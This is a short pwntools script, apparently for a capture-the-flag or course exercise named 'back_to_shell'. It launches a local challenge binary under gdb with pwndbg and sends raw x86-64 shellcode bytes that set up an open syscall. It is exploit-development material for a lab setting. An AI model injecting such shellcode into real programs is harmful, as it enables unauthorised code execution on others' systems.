from pwn import *
import os, shutil

TARGET = "/home/k/ODC/c1/back_to_shell"

# find pwndbg init if you want pwndbg loaded
pwndbg_init = None
candidates = [
    "/usr/local/lib/pwndbg-gdb/exe/gdbinit.py",   # from your wrapper
    os.path.expanduser("~/.pwndbg/gdbinit.py"),
    os.path.expanduser("~/.gdbinit"),
    "/usr/share/pwndbg/gdbinit.py",
]
for c in candidates:
    if os.path.exists(c):
        pwndbg_init = c
        break

# build gdbscript: source pwndbg then set breakpoints
gdbscript = ""
if pwndbg_init:
    gdbscript += f"source {pwndbg_init}\n"
gdbscript += "set pagination off\nset breakpoint pending on\nb *0x40116e\n"

# Launch process normally and attach gdb
p = process(TARGET)
gdb.attach(p, gdbscript=gdbscript)    # avoids pwntools' gdbserver usage
# If you need to send payload after breakpoints, you can sleep or set breakpoint commands accordingly
p.send(b"\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05")
p.interactive()

